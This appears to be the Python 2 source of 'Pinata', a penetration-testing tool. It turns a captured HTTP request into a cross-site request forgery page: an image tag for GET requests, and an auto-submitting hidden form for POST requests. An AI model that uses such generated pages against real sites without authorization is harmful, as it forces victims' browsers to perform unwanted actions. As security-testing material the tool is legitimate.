## Developed by Ahsan Shahzad Mir Nov 2010. Turkey Day Edition :)
## This script does not come with any warranties.
## All liabilities for uses/misuse lies with the user.
# Again this code is in the public domain, it comes
# with absolutely no warranty.

# Pinata Version 0.95 - 13th Jan 2017
#   1 - Minor bug fix. Better error handling if ':' in GET header- courtesy Christophe Vantet

# Pinata Version 0.94 - 7th Jan 2014
#   1 - Minor bug fix. Issues around reading CSRFBody.txt on *nix systems.

# Pinata Version 0.93 - 23rd Nov 2010
#   1 - Added code to remove trailing newline characters from a GET request.

#Pinata Version 0.92 - 27th July 2010
#       1 - Adds support for Webscarab and Paros proxy.
#       2 - Commented out sections in Markup.py which were escaping '&' into '&amp;'
#           in the url string.

#Pinata Version 0.91 - 1st May 2010
# Fixes issues with prasing header string with multiple colons.



import string
import os
import cgi
import markup
import urllib2


def encodedToDict(fp):
    pairs = fp
    res = {}

    for parm in pairs:
        if ':' not in parm: continue
        #print parm
        key, value = parm.split(': ',1)
        key = urllib2.unquote(key)
        value = urllib2.unquote(value)
        if not res.has_key(key):
            res[key] = value
        else:
            res[key].append(value)
    return res

def parseHTTP(f):
    """This will read and store the first line of the HTTP Response. This function
    will then return a string list of the words in the first line.
    """
    words = f.split()
    methodsPath = []

    for word in words:
        methodsPath.append(word)
    return methodsPath

def splashVerb(vb):
    """This will Echo the HTTP VERB.
    """
    action = vb[0]
    return action


 ############## This Section for Multipart POST Requests ################

def multiPart():
    """ This will process multipart forms
    """
    con = cgi.parse_header(contentT)
    con = con[1]

    mKV = cgi.parse_multipart(rawHTTPRequest1, con)
    mKeys = mKV.keys()
    vTemp = ''
    mValues = []
    for v in mKV.values():
        vTemp = v[0]
        mValues.append(vTemp)

    return mKeys, mValues

###########################################################################

 ############## This Section for Standard POST Requests ################

def standPost(paras):
    """ This will process Standard Post forms
    """
    keysP = []
    valuesP = []
    paras = payload.split('&')

    for para in paras:
            temp = para.split("=")
            keysP.append(temp[0])
            valuesP.append(temp[1])
    return keysP, valuesP
    
####################################################################

 ############## This Section for GET HTML ################

def genGetHTML(hostGB):
    print "Please check your working directory for CSRF Proof of Concept HTML File."
    print " "
    #HTML is generated here.
    page = markup.page( )
    page.init( title="Pinata-CSRF-Tool")
    #page.form (action=hostGB, method = "GET", id = "formid" )
    page.img(src=hostGB)
	#page.img(src=hostGB.replace('https','http'))

    print " "
    t = open("CSRFGet.html", 'w')
    page = str(page)
    t.write(page)
    t.close()
    
####################################################################

############## This Section for POST MultiForm HTML ################
    
def genPOSTMFHTML(k,v, hostB):
    print "Please check your working directory for CSRF Proof of Concept HTML File."
    print " "
    subScript = ("document.getElementById('formid').submit();")
    #HTML is generated here. 
    page = markup.page( )
    page.init( title="Pinata-CSRF-Tool")
    page.form (action=hostB, enctype="multipart/form-data", method = "post", id = "formid" )
    page.input( type="hidden", name=k, value=v  )
    page.form.close()
    page.script()
    page.add("document.getElementById('formid').submit();")
    page.script.close()

 #   print page
    print " "
    t = open("CSRFPostMulti.html", 'w')
    page = str(page)
    t.write(page)
    t.close()
    
####################################################################
    
############## This Section for POST Standard HTML ################
def genPOSTHTML(k,v, hostB):
    print "Please check your working directory for CSRF Proof of Concept HTML File."
    print " "
    print " "
    subScript = ("document.getElementById('formid').submit();")
    #HTML is generated here. 
    page = markup.page( )
    page.init( title="Pinata-CSRF-Tool")
    page.form (action=hostB, method = "post", id = "formid" )
    page.input( type="hidden", name=k, value=v  )
    page.form.close()
    page.script()
    page.add("document.getElementById('formid').submit();")
    page.script.close()

    #print page
    print " "
    t = open("CSRFPostStand.html", 'w')
    page = str(page)
    t.write(page)
    t.close()
####################################################################

                      ########## MAIN BLOCK ##########


rawHTTPRequest = open('CSRFBody.txt', 'r')
rawHTTPRequest1 = open('CSRFBody.txt', 'r')
rawParts = rawHTTPRequest.readline()
verb = parseHTTP(rawParts)
rawHeadBod = rawHTTPRequest.readlines()
methodType = verb[0]
uri = verb[1]



if methodType == 'GET':
    ######################## GET PROCESSING HERE ###################################
    print "The HTML Form uses a GET method, Generating CSRF HTML.................."
    print " ####################################################################"
    print " "
    header = rawHeadBod


###### This sections removes any trailing newline characters from a GET request ##########
    
    if '\n' in header:
        sep = header.index('\n')
        length = len(header)-1
        header = header[0:sep]
########################################################################################

    uri = string.rstrip(uri)

    dicHeader = {}
    dicHeader = encodedToDict(header)
    host = dicHeader['Host']
    host = string.rstrip(host)

    ##Adding checks for whether the raw HTTP is in Burp format or WebScarab/Paros format.
    if uri.find('http') == -1:
            # This is a Burp style raw HTTP
            hostG = "https://"+host+uri
    else:
            #This is a Webscarab/Paros style raw HTTP
	    hostG = uri

    genGetHTML(hostG)

elif methodType == 'POST':
    ######################## POST PROCESSING HERE ###################################
    print " The HTML Form uses a POST method. Scanning for multipart form........."
    print " ####################################################################"
    print " "
    #### Takes head and Body of request in 'rest", splits it at \n into header and payload
    ####
    
    
    rest = rawHeadBod
    sep = rest.index('\n')
    length = len(rest)-1
   
    header = rest[0:sep]
    payload = rest[-1]
    uri = string.rstrip(uri)
       
    dicHeader = {}
    dicHeader = encodedToDict(header)
    #print dicHeader

    host = dicHeader['Host']
    contentT = dicHeader['Content-Type']
    host = string.rstrip(host)



    ##Adding checks for whether the raw HTTP is in Burp format or WebScarab/Paros format.
    if uri.find('http') == -1:
            # This is a Burp style raw HTTP
            hostA = "https://"+host+uri
    else:
            #This is a Webscarab/Paros style raw HTTP
            hostA = uri
    


    
    if contentT.find('multipart') == -1:
        print " Multipart Form idicators were not found - This is a standard POST Request"
        print " ####################################################################"
        pKeys, pValues = standPost(payload)
        genPOSTHTML(pKeys, pValues, hostA)            
    else:
        print " Multipart From idicators were found - This is a Multipart POST Request"
        print " ####################################################################"
        mKeys1, mValues1 = multiPart()
        genPOSTMFHTML(mKeys1, mValues1, hostA)
    
else:
    print "Please check your HTTP Form, incorrect VERB detected"
    rawHTTPRequest.close()
    exit()

